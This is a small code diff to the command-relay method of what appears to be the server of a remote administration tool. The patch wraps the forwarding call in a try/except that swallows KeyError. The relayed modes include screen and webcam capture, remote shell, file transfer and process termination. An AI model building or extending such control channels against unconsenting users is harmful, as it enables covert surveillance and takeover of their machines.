@@ -456,7 +456,10 @@ class ModeratServerProtocol(LineReceiver):
         elif data['mode'] in ['getScreen', 'getWebcam', 'setLogSettings', 'updateSource',
                               'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode',
                               'downloadMode', 'uploadMode',]:
-            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'], module_id=data['module_id'])
+            try:
+                self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'], module_id=data['module_id'])
+            except KeyError:
+                pass
         else:
             log.critical('[*MALFORMED] [MODE: %s]' % data['mode'])
 
